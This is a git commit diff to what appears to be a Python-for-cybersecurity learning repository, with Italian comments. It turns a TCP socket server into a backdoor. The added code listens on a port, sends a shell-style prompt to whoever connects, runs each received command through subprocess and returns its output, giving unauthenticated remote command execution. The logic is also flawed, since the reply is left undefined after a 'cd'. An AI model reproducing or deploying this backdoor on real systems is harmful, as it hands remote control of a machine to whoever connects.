a63ee28403a3a8054faddc51db3f754a72c8aba6
Paolo Rampino <liadserv@gmail.com>
2025-07-10 05:13:28 -0400

    ls

--- PythonInCybersec/backdoorStep2.py
+++ PythonInCybersec/backdoorStep2.py
@@ -1,8 +1,9 @@
 import socket as so
+import os, subprocess
 
 # socket, ha bisogno di una tupla contenete (ip dove fare il bind, e porta)
 SRV_ADDR = "10.0.2.15"
-SRV_PORT = 44444
+SRV_PORT = 44445
 
 # Creaimo un oggetto che ci faccia gestire la connessione
 # AF_INET e' ipv4, mentre SOCK_STREAM e' tcp, curiosita' SOCK_DGRAM e' udp
@@ -26,14 +27,31 @@ print("Server Avviato! Sono in attesa di connessione ...")
 connection, address = s.accept()
 print(f"Qualcuno si e' connesso dall'indirizzo {address[0]} usando la porta {address[1]}")
 # e ora sfruttiamo connection che in pratica sta dialogando col client
-while True:
+
+while True: 
+       # ottengo la directory corrente
+       cartella = os.getcwd()
+       # Facciamo un prompt simile al terminale linux
+       prompt = f"{cartella} $ "
+       # lo invio al client
+       connection.sendall(prompt.encode())
        # mi metto in ascolto della risposta
        data = connection.recv(1024)
+       # ora traformiamo data in un comando comprensibile dal terminale in utf-8 e puliamo da \n con strip 
+       comandi = data.decode('utf-8').strip().split(" ")
+       # cerchiamo il comando coma cd ls etc
+       comando = comandi[0]
+       if comando == "cd":
+              # la directory e' il secondo argomento
+              os.chdir(comandi[1])
+       else:
+              # possiamo ora inviare il comando al sistema
+              risposta = subprocess.run(comandi, capture_output=True, text=True)
        # se il client non sta dialogando o ha interrotto la connessione
        # devo uscire dal ciclo
        if not data: break
        # se invece ha inviato dati diamo feedback al client inviando una risposta
-       connection.sendall(b"--comando ricevuto--\n")
+       connection.sendall(risposta.stdout.encode())
        # stampiamo quello che il client ci ha inviato
        print(data.decode('utf-8'))
 # alla fine del ciclo dobbiamo chiudere la connessione
